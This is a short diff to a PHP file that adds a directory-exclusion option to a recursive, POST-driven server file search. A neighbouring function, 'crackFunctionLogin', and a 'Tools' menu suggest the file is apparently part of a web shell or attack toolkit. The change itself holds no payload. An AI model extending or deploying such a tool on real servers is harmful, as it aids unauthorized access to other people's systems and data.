@@ -513,15 +513,15 @@ function crackFunctionLogin($info){
 	}
 }
 
-function searchString($method, $dir, $string, $ext, &$output = array())
+function searchString($method, $dir, $string, $ext, $exclude, &$output = array())
 {
 	if(is_dir($dir)) {
 		$files = scandir($dir);
 		foreach($files as $file) {
 			$path = realpath($dir.DIRECTORY_SEPARATOR.$file);
 			
-			if($file == "." || $file == "..") continue;
-			if(is_dir($path)) searchString($method, $path, $string, $ext, $output);
+			if($file == "." || $file == ".." || in_array($file, array_map("trim", explode(",", $exclude)))) continue;
+			if(is_dir($path)) searchString($method, $path, $string, $ext, $exclude, $output);
 				
 			if($ext != "*") {
 				$getExtension = strtolower(pathinfo($path, PATHINFO_EXTENSION));
@@ -1030,8 +1030,9 @@ function search(){
 		$string = $_POST["string"];
 		$dir = $_POST["dir"];
 		$ext = $_POST["ext"];
+		$exclude = $_POST["exclude"];
 
-		$outputFile = searchString($method, $dir, $string, $ext);
+		$outputFile = searchString($method, $dir, $string, $ext, $exclude);
 		pages("search", ["Tools", "Search"], array("{{OUTPUT}}", "{{DIR}}"), array(implode("\n", $outputFile), $path));
 	}
 }
